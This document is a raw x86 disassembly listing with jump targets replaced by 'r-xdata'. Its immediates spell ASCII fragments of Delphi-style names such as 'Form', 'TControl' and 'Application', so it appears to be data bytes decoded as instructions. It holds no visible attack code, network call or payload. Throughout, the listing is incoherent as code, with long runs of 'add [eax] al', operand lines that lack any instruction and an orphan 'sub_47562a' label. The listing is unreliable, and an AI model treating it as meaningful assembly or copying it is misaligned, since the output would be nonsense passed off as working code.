or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
insb
jns r-xdata
jae r-xdata
dec edi
insb
jo r-xdata
insd
imul edi [ edx + 0x65 ] 0x48696206
jo r-xdata
jb r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
push eax
outsd
jb r-xdata
outsd
outsb
inc ecx
jb r-xdata
je r-xdata
je r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
push cs
je r-xdata
popad
je r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
insb
or [ fs : esi + 0x73 ] esp
dec ebp
nop
add al 0x4e
push cs
jo r-xdata
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
adc [ eax + 0x6f ] dh
jo r-xdata
dec ebp
inc edi
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
mov al 0x4d
jb r-xdata
nop
inc esi
outsd
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0xc00474d ] dh
outsd
popad
jns r-xdata
nop
inc esi
outsd
jb r-xdata
jae r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
inc esi
outsd
jae r-xdata
popad
dec ebp
je r-xdata
inc esp
jae r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
mov ah 0x4e
inc edi
add [ ecx ] cl
insd
inc esp
popa
jne r-xdata
push es
add eax 0x6d726f46
jae r-xdata
insd
popad
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
jae r-xdata
dec esi
inc edi
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
jae r-xdata
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax ] bl
dec esi
inc edi
add [ edx ] cl
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
outsd
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
push esp
dec edi
inc edi
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
inc ebx
insb
outsd
inc ebp
jbe r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
jb r-xdata
jb r-xdata
jo r-xdata
jo r-xdata
push es
outsd
nop
nop
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] cl
dec edi
inc edi
dec edi
inc edi
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
inc edi
add [ esi ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
push eax
dec edi
add eax 0x6d726f46
jo r-xdata
jne r-xdata
nop
nop
inc esp
jae r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax + 0x57 ] al
inc esp
add [ eax + 0x4f ] dl
inc edi
add [ eax + 0x4fe09090 ] dl
inc edi
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax + 0x57 ] al
inc esp
add [ eax ] bl
push esi
inc esp
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
jb r-xdata
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ eax + 0x4f ] dl
pushfd
jo r-xdata
dec esi
outsd
outsb
push cs
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
andps xmm0 [ ebp + 0x66 ]
dec esi
inc edi
add [ ebx ] al
push esp
push eax
dec edi
ja r-xdata
mov ah 0x4d
inc edi
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
push edi
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
jne r-xdata
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
sbb [ esi + 0x44 ] dl
add [ eax ] al
cwde
push esi
inc esp
add [ esi + edx * 2 + 0x44 ] ch
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
inc esi
outsd
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
jb r-xdata
insb
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
jo r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
add [ eax ] bl
push esi
inc esp
add [ eax + 0x50bc9090 ] dl
inc edi
add [ ebx ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
insb
push esi
inc esp
jbe r-xdata
dec eax
add [ eax + 0x3f ] ch
outsd
or dh [ eax + 0x6d ]
inc ebp
js r-xdata
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
add [ esi ] al
add [ eax ] al
or [ edi + 0x47 ] cl
jae r-xdata
adc [ eax + 0x6f ] esi
insd
outsd
dec eax
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ebx ] al
inc esi
jb r-xdata
aas
add [ eax ] al
pop esp
push ecx
inc edi
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x6004750 ] bh
dec eax
popad
outsb
insb
pop es
inc edx
pop es
jo r-xdata
add [ eax ] al
mov eax 0x6004750
outsb
je r-xdata
dec eax
add [ ebx ] cl
push esp
inc edi
insb
aas
insb
imul esp [ ebx + 0x69 ] 0x6f460574
jb r-xdata
add [ eax + eax ] dh
add [ eax ] al
aam 0x1c
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ ebp + ecx * 2 + 0x4e900042 ] dl
imul esi [ ebp + eax + 0x46 ] 0x736d726f
dec esp
jb r-xdata
dec edi
inc edi
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
add [ eax ] al
add [ eax ] bl
push esi
inc esp
add [ eax + 0x50 ] ah
inc edi
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 + 0x55900047 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bl
push ebx
inc edi
add [ esi + 0x55 ] bh
inc edi
push esi
inc esp
add [ eax + eax ] dl
add bh bh
adc [ ecx + 0x48 ] al
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ 0x68676952 ] al
je r-xdata
add al 0x4c
je r-xdata
insd
insb
push ecx
inc edi
add [ edi ] al
or edx [ edi + eax * 2 + 0x6c ]
popad
jae r-xdata
inc edx
add [ eax + 0x1000424e ] bl
add [ eax + eax - 0x6c ] 0x9000424d
dec esi
outsd
outsb
push es
jo r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
popad
jae r-xdata
jae r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ ebx + eax ] bh
add [ edi + edi - 0x7d93ffb9 ] bl
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff879352d4
push esi
inc esp
add [ eax ] bl
add [ eax ] al
call [ eax ]
inc ecx
dec eax
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
push es
inc edx
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esi
inc esp
add [ eax ] dl
add [ eax ] al
call [ eax ]
inc ecx
push esp
outsd
jo r-xdata
inc esi
jb r-xdata
dec esi
nop
inc ecx
add [ eax + eax + 0x64 ] 0x94004481
dec ebp
inc edx
add [ eax - 0x67ffbdb2 ] dl
dec esi
inc edx
add [ eax ] dl
push ecx
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 2 + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 2 + 0x47 ] bl
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
mov esi 0x81480047
add eax 0x68530c00
je r-xdata
outsd
insd
sbb [ esi + 0x44 ] dl
add [ eax ] ch
add [ eax ] al
push [ eax + 0x41 ]
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x5c004789 ] dh
jne r-xdata
add [ eax - 0x42 ] dh
inc edi
add [ eax - 0x7f ] cl
inc di
insb
popad
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add edx [ edi + ebp * 2 + 0x70 ]
insb
insd
dec esp
push ecx
inc edi
add [ ebp + ebx + 0x42 ] dl
add [ esi ] al
add [ 0x6d726f46 ] al
jae r-xdata
in al 0xce
dec eax
add [ esp + edx * 4 + 0xa540047 ] cl
dec ecx
add al al
in al 0x47
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffff88479bf3
xchg esi eax
inc edi
add [ ebp + edx * 4 + 0x47 ] al
add [ eax ] al
dec eax
add [ edi + edx * 4 - 0x311fffb9 ] al
dec eax
add al bl
or cl [ ecx ]
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x63ffb87d ] cl
lahf
inc edi
add [ eax ] al
sub eax 0xb3f40049
inc edi
add [ ebx + edi * 4 + 0x47 ] bh
add [ eax - 0x67ffb847 ] al
sub eax 0x2dbc0049
dec ecx
add al bh
mov esp 0xbe2c0047
inc edi
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
add [ eax ] dl
nop
inc edi
add al al
dec ebp
inc edx
add al al
mov eax [ edi ]
inc esp
mov [ edi ] es
or [ ebp - 0x2287ffb9 ] 0x48
add [ edx + ebp * 8 ] dl
inc edx
add [ edi + edx * 4 + 0x47 ] al
add [ eax ] dl
out 0x42 eax
add [ eax + ebp * 8 ] dl
inc edi
add [ ebp + eax * 4 + 0x6f800047 ] ah
dec ecx
add [ ebp + esi * 2 + 0x74d80049 ] cl
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add [ eax + 0x3c004793 ] al
dec cx
add ah ah
into
fisttp [ eax ]
adc al 0xea
nop
nop
lodsb [ esi ]
push edx
inc edi
add [ eax ] al
jmp eax
add [ eax ] bl
push esi
inc esp
add [ eax ] cl
push cs
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax + ebp * 2 + 0x49 ] bh
add [ ebp + eax * 8 + 0x47 ] ah
add [ eax ] cl
jge r-xdata
add [ edx + eax + 0x4cd00000 ] dl
inc edi
add [ eax + 0x4000002 ] ch
dec ebp
inc edi
add [ eax + 0x34000002 ] bh
dec ebp
inc edi
add [ ebx + eax ] al
add [ ebp ] al
sldt [ ebp + 0x27001400 ]
add [ edi ] dh
add [ ecx - 0x5eff7c00 ] al
add [ edx ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
inc esp
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add [ edi + ebx * 8 + 0x7d680047 ] ah
inc edi
add [ eax ] bl
add [ edi ] 0x38
into
inc edi
add ah ah
mov al [ edi ]
pushad
mov eax [ edi ]
add al 0xe4
inc edi
add [ eax ] al
mov [ edi ] eax
mov dh bl
inc edi
add [ eax ] al
rol [ edi ] 0x7c
loopne r-xdata
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ ebx + 0x17b00000 ] al
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x48
mov al 0x45
mov al 0x44
mov al 0x40
mov al 0x3f
mov al 0xb0
[ edi - 0x13001201 ]
and [ ecx ] al
pop ds
add [ eax ] al
les edx [ esi + 0x44 ]
add [ esi + edx * 4 + 0xe0047 ] al
add [ eax ] al
add [ eax ] al
add al 0x0
sub_47562a
inc edi
add [ eax - 0x77 ] cl
inc edi
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x42 ] dh
inc edi
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x5c004789 ] dh
jne r-xdata
in al 0xce
dec eax
add [ esp + edx * 4 + 0xa540047 ] cl
dec ecx
add al al
in al 0x47
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffff88479f8b
xchg esi eax
inc edi
add [ ebp + edx * 4 + 0x47 ] al
add [ eax ] al
dec eax
add [ edi + edx * 4 - 0x311fffb9 ] al
dec eax
add al bl
or cl [ ecx ]
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x63ffb87d ] cl
lahf
inc edi
add [ eax ] al
sub eax 0xb3f40049
inc edi
add [ ebx + edi * 4 + 0x47 ] bh
add [ eax - 0x67ffb847 ] al
sub eax 0x2dbc0049
dec ecx
add al bh
mov esp 0xbe2c0047
inc edi
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
add [ eax ] dl
nop
inc edi
add al al
dec ebp
inc edx
add al al
mov eax [ edi ]
inc esp
mov [ edi ] es
or [ ebp - 0x2287ffb9 ] 0x48
add [ edx + ebp * 8 ] dl
inc edx
add [ edi + edx * 4 + 0x47 ] al
add [ eax ] dl
out 0x42 eax
add [ eax + ebp * 8 ] dl
inc edi
add [ ebp + eax * 4 + 0x6f800047 ] ah
dec ecx
add [ ebp + esi * 2 + 0x74d80049 ] cl
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add [ eax + 0x3c004793 ] al
dec cx
add ah ah
into
add eax 0x726f4654
insd
add [ eax + ebp * 2 + 0x49 ] bh
add [ ebp + eax * 8 + 0x47 ] ah
add [ eax ] cl
jge r-xdata
add [ eax ] al
add [ 0x6c410500 ] dl
add [ eax + 0x2f ] dh
inc edx
add [ eax + eax ] bh
add dh bh
dec esp
ror [ eax ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
add eax 0x726f4654
insd
inc esp
push esi
inc edi
add [ ebp + edx * 2 + 0x6c0047 ] cl
add eax 0x6d726f46
jae r-xdata
pop es
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add [ edi + ebx * 8 + 0x7d680047 ] ah
inc edi
add [ eax ] bl
add [ edi ] 0x38
into
imul esp [ edi + 0x6e ] r-xdata
xor [ ebx ] al
add bh bh
jo r-xdata
add [ eax ] 0x0
add [ eax ] al
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ edx ] cl
inc ecx
insb
jo r-xdata
inc edi
add ah ah
mov al [ edi ]
pushad
mov eax [ edi ]
add al 0xe4
inc edi
add [ eax ] al
mov [ edi ] eax
mov dh bl
inc edi
add [ eax ] al
rol [ edi ] 0x7c
loopne r-xdata
cmp dh cl
dec eax
add [ eax + 0x2 ] bh
add bh bh
aam 0xbe
inc edi
add [ eax + ebp * 4 + 0x47 ] bl
add [ eax - 0x80000000 ] al
adc al 0x0
or eax 0x69746341
jbe r-xdata
je r-xdata
add [ esi + edx * 4 + 0x54050047 ] al
inc esi
outsd
jb r-xdata
add [ eax ] al
sbb [ eax ] eax
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
test [ fs : esi + 0x44 ] dl
add [ ecx ] dh
add eax [ eax ]
inc [ ecx + ebp * 8 + 0x10047 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0xff ] al
pop ss
add [ edi ] cl
inc ecx
insb
jo r-xdata
inc ebx
outsd
outsb
je r-xdata
outsb
js r-xdata
outsd
add [ eax ] al
jmp [ eax - 0x2e ]
nop
nop
pop eax
push edi
inc edi
add [ edi ] al
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
sbb [ esi + 0x44 ] dl
add [ eax + eax ] bl
add [ eax ] al
sbb al [ eax ]
or [ ecx + 0x75 ] al
je r-xdata
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
jpo r-xdata
adc eax 0x6c410500
outsd
insb
shl [ ecx + 0x48 ] 0x1
add [ ebx ] bl
add bh bh
pushad
ror [ eax ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
sbb al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
inc ecx
inc edi
add [ ecx - 0x5300fffe ] al
movsb [ edi ] [ esi ]
inc edi
add [ eax + ebp * 4 + 0x47 ] bl
add [ eax + 0x2 ] al
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
xchg esp eax
loopne r-xdata
outsd
push 0x6100487b
add [ eax ] al
[ edi + ecx * 8 - 0x2f37ffb8 ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop esp
add [ eax ] al
add [ ecx ] ah
add bh bh
lodsb [ esi ]
iretd
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307001f ] al
popad
jo r-xdata
jb r-xdata
add [ eax ] al
and [ eax ] 0x0
jb r-xdata
add [ edx + edx * 4 + 0x47 ] dh
add [ eax - 0x80000000 ] al
and [ eax ] eax
or eax [ ebx + 0x6c ]
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
insb
xchg ebp eax
insb
call 0xffffffffb047a194
add [ eax ] eax
jmp [ edx + ebp * 2 ]
sbb eax 0x6f420b00
jb r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208001b ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
dec esi
inc edi
add [ eax - 0x4f00fffe ] al
mov [ 0xffffffffa89c0047 ] al
inc edi
add [ eax ] al
add [ eax ] al
pop eax
add eax [ eax ]
[ ecx + ebp * 8 + 0x10047 ]
or al 0x43
imul ebp [ edi + 0x6e ] r-xdata
mov esp 0xa00048d8
xchg ebp eax
inc edi
add [ edx + edx * 4 + 0x47 ] dh
add [ eax - 0x80000000 ] al
and [ eax ] al
jb r-xdata
jae r-xdata
arpl [ edi + 0x6e ] bp
popad
outsb
jae r-xdata
int3
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x44566c74
add [ eax - 0x28 ] bh
dec eax
add [ ebp + edx * 4 + 0x47 ] ch
add [ eax - 0x4bffb86b ] ah
xchg edx eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c0020 ] al
inc edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
push 0xa00048df
fisttp [ eax ]
pushfd
test al 0x47
add [ eax ] al
push ebp
jae r-xdata
popad
jb r-xdata
dec ecx
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
add [ eax + 0x1 ] al
insb
inc edx
jne r-xdata
je r-xdata
dec esi
inc edi
add [ ecx - 0x7600fffe ] cl
add al [ eax ]
[ eax + ebp * 4 + 0x47 ]
add [ eax + 0x3 ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ cs : edx ] cl
push eax
popad
jb r-xdata
popad
inc ebp
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al [ eax ]
push cs
inc esp
outsd
jne r-xdata
push esi
inc esp
add ah ah
add [ eax ] eax
call [ eax + 0x52 ]
add [ eax ] al
add [ es : 0x336c7443 ] al
inc esp
sbb [ esi + 0x44 ] dl
add bl ah
add [ eax ] eax
jmp [ ebx + ebp * 2 + 0x10049 ]
sbb [ esi + 0x44 ] dl
sub eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
sub al 0xd1
dec eax
add [ eax ] ah
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
sbb [ gs : esi + 0x44 ] dl
add [ eax + eax ] cl
je r-xdata
daa
add [ esi ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
insb
cmp eax 0x2600047
add bh bh
add [ edi + 0x47 ] bh
push ebx
je r-xdata
insb
outsb
je r-xdata
bound ebp [ ebp + 0x64 ]
sbb [ esi + 0x44 ] dl
add [ ecx ] bl
add bh bh
pushfd
loopne r-xdata
les edi [ fs : edx + 0x48 ]
add [ ebx - 0x74010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
sbb [ gs : esi + 0x44 ] dl
add [ edx + eax ] dl
dec [ eax ]
push ebx
dec ecx
add [ edx + ebp * 2 + 0x49 ] dh
outsd
outsb
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
sbb al 0x7c
dec eax
add [ eax ] dh
add bh bh
mov [ ecx + ecx * 2 ] cs
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0025 ] al
outsd
outsb
jae r-xdata
add [ eax + 0x8ff0002 ] ah
retn 0x46
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d0011 ] al
insb
push 0x64004751
inc esi
add [ eax - 0x6f00fffe ] bl
test al 0x47
add [ eax + ebp * 4 + 0x47 ] ah
add [ eax - 0x80000000 ] al
xor eax [ eax ]
add al 0x49
inc esi
jb r-xdata
add eax [ eax ]
call [ eax + 0x10047ea ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x470a0031 ] al
push 0x64004751
outsd
outsb
je r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
in al 0x1
add bh bh
push eax
push edx
jb r-xdata
add [ eax ] al
popad
add [ eax + ebp * 4 + 0x47 ] bl
add [ eax - 0x80000000 ] al
add [ ss : ecx * 2 + 0x18756e65 ] al
push esi
inc esp
add [ ecx + 0x3 ] ch
add bh bh
imul eax [ ebx ] 0x1ff00
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
insb
inc ebx
jb r-xdata
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0037 ] al
jb r-xdata
outsd
jb r-xdata
dec eax
insd
insb
push esi
inc esp
add [ eax + eax ] cl
[ esi + edx * 8 ]
sub eax 0x6e450700
mov eax 0x4907
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
mov ecx 0x640046
add bh bh
loopne r-xdata
sub [ eax ] al
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
add [ eax ] al
add cl ah
add [ eax ] eax
inc [ edx + ebp * 2 + 0x49 ]
add [ eax + 0x6a ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x44561873
mov [ gs : ebp + 0x47 ] ss
outsb
arpl [ eax + 0x44 ] bp
pop ds
inc esi
add [ eax + eax ] bh
inc [ edi + ebx * 8 + 0x48 ]
add [ eax + ebp * 4 + 0x47 ] bl
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or [ eax + 0x6f ] edx
add [ eax ] al
dec edi
jb r-xdata
je r-xdata
popad
jbe r-xdata
popad
jae r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or al [ edi + 0x6c ]
add [ eax + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604002f ] al
outsd
outsb
je r-xdata
add eax [ eax ]
call [ eax + 0x3 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ edx + eax + 0x28cff00 ] cl
add bh bh
pushfd
test al 0x47
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
aas
add [ edx ] cl
push eax
jb r-xdata
jo r-xdata
add [ ebx + eax ] bh
add bh bh
xor al 0xae
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc edi
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
or eax 0x65786950
jb r-xdata
jb r-xdata
ja r-xdata
push es
add [ esi ] al
dec eax
imul esp [ gs : edi + 0x68 ] 0x4456c474
add [ edx + eax + 0x294ff00 ] dl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
xor [ eax ] al
or [ esi + 0x6f ] eax
jb r-xdata
dec ebp
inc edi
add [ edi - 0x3300fffe ] al
test al 0x47
add [ eax + ebp * 4 + 0x47 ] bl
add [ eax ] al
add [ eax ] cl
push ebx
push esi
inc esp
add [ ecx - 0x3f010000 ] cl
inc ecx
add [ edx ] cl
push ebx
arpl [ edx + 0x65 ] si
add [ eax - 0x5bffb852 ] bl
scasb [ edi ]
inc edi
add [ eax + ebp * 4 + 0x47 ] bl
add [ eax + 0x1 ] al
inc eax
add [ esi ] al
popad
jb r-xdata
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
sbb [ esi + 0x47 ] cl
outsb
jne r-xdata
add [ eax ] 0x0
add [ eax + 0x500d003a ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
pop ss
inc esi
add [ edx + eax - 0x55430100 ] dh
inc edi
add [ eax + ebp * 4 + 0x47 ] bl
add [ eax - 0x80000000 ] al
cmp [ eax ] al
push cs
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
add al [ eax ]
